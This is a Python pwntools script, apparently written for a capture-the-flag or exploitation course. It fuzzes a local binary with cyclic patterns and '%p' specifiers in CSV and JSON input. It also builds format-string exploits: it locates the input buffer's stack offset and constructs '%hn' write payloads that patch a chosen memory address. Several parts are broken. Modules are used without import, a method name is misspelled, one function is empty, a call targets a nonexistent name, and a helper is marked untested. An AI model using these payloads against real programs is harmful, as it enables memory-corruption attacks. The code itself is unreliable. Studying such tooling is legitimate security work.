from pwn import *
import json
import subprocess
import logging

# config - debug level won't be logged
logging.basicConfig(filename='/tmp/aaaalog.log', level=logging.INFO, format='[%(levelname)s] %(asctime)s - %(name)s - %(message)s')


def fuzzy_csv(fname:str):
    # TODO
    bad_csv = f'header,must,stay,intact\n%p,%p,%p,%p\n{cyclic(100)},{cyclic(200)},{cyclic(300)},{cyclic(400)}'
    with open(fname, 'w') as f:
        f.write(bad_csv)

'''
Generate and run a JSON bad.txt against binary. Log, write the bad input to bad.txt and exit if program exits with a non-zero status.

Returns: the return code of the binary
'''



# TODO make a data structure for all bad inputs and iterate through that

def fuzzy_json(binary:str, injson:str, outjson:str) -> bool:
    cmd = f'./{binary}'

    with open(injson, 'r') as inf:
        jsondict = json.load(inf)
        log.info('JSON file input: ' + str(jsondict))

        with open(outjson, 'w') as outf:
            
            # for storing return status
            # shout if current status is different to the previous one
            ret_Status = []
            
            # [no file(Normal), 10(Normal), 100(Normal), 1000(Nomral), 10000(Invalid)]
            # for storing all cyclic that is used
            # cyclic for now, will add other payload
            payload = []
            
            # try empty file
            badjson = ''
            ret = subprocess.run(cmd, input=badjson, stdout=subprocess.PIPE, text=True)
            if ret.returncode != 0:
                log.critical('Crashed on empty file')
                outf.write(badjson)
            out1 = ret.stdout
            
            ret_Status.append(out1)
            
            logging.info('json empty file output:\n' + out1)
            context.cyclic_alphabet = string.ascii_lowercase
            cycle = 1
            
            # Try cyclic 10, 100, 1000, 10000, 100000
            while (cycle <= 5):
                cyclic_int = int(math.pow(10, cycle))
                
                single_Payload = f"{cyclic_int}: cylic({cyclic_int})"
         
                payload.append(single_Payload)
                
                cyclic_str = cyclic(cyclic_int, alphabet = string.ascii_lowercase)
                
                for k in jsondict:
                    jsondict[k] = cyclic_str
                badjson = str(jsondict).replace("'",'"')
                outf.write(badjson)
                log.info(badjson)
                ret = subprocess.run(cmd, input=badjson, stdout=subprocess.PIPE, text=True)
                
                if ret.returncode != 0:
                    log.critical(f'Crashed on cyclic({cyclic_int})')
                    outf.wirte(badjson)
                out = ret.stdout
                log.info(out)
                ret_Status.append(out)
                
                if (cycle == 1): 
                    cycle += 1
                    continue
                
                previous_int = int(math.pow(10, cycle - 1))
                previous_str = cyclic(previous_int, alphabet = string.ascii_lowercase)
                
                prev_Ret = ret_Status[cycle - 1].replace(previous_str, " ")
                
                curr_Ret = ret_Status[cycle].replace(cyclic_str, " ")
                    
                if prev_Ret != curr_Ret:
                    print(f"Changed return status at {cycle}")
                    prev_Cyc = cyclic_int
                    curr_Cyc = int(math.pow(10, cycle - 1))
                    log.info(f'code flow changed - {cycle - 1} -> {cycle}')
                    break;
                
                cycle += 1
                    
    return ret.returncode

def random_Chars(len: int) -> str:
    all_char = r'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890::::::{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"{}"'
    



# TODO untested - modified from %hhn to %hn for less int overflows
'''
Return the padding values in little endian
'''
def get_padding(v: int, w_padding: int):
    byte = list(p32(v))
    padding = list(byte)
    
    # add word padding first
    padding[0] -= w_padding

    if (byte[0] >= 16):
        padding[0] -= 16 # assuming addr addr+1
    else:
        padding[0] = 256 - 16 + padding[0]

    for i in range(1, len(byte)):
        if (byte[i] < byte[i - 1]):
            # do int overflow
            padding[i] = abs(65536 - byte[i - 1]) + byte[i]
            print(padding)
        
        else:
            padding[i] = byte[i] - byte[i - 1]
            print(padding[i])

    return padding

def construct(offset: int, target: int, value: int, w_padding: int):
    
    padding = get_padding(value, w_padding)

    '''
    Construct payload
    '''
    payload = p32(target) + p32(target + 1)

    for i in range(0, 2):
        if (padding[i] != 0):
            payload += f'%{str(padding[i])}c'.encode()
        payload += f'%{offset + i}$hn'.encode()
    
    return payload

'''
Assuming a format string vulnerability, attempts to find the start of the input buffer from stdin
'''
def find_fmtbuf_stdin(binary_name:str, iter:int) -> bool:
    for i in range(iter):

        io = process(f'./{binary_name}')
        io.sendline('AAAA' + '%{}$p'.format(i))
        try:
            r = io.recvline(timeout=0.1)
            print(r)
            if b'4141' in r: # at least 2 A's in the pointer
                return True
        except Exception as e:
            logging.error(e)
            pass
        io.close()

    return False

'''
Wrapper to construct payload + send to stdin
'''
def write_payload_stdin(io: tube, fmtstr_offset: int, target_addr: int, to_write: int, word_padding: int) -> None:
    try:
        io.sendline(fmtstr_payload.construct(fmtstr_offset, target_addr, to_write, word_padding))
        io.close()
    except Exception as e:
        logging.error(e)
        pass

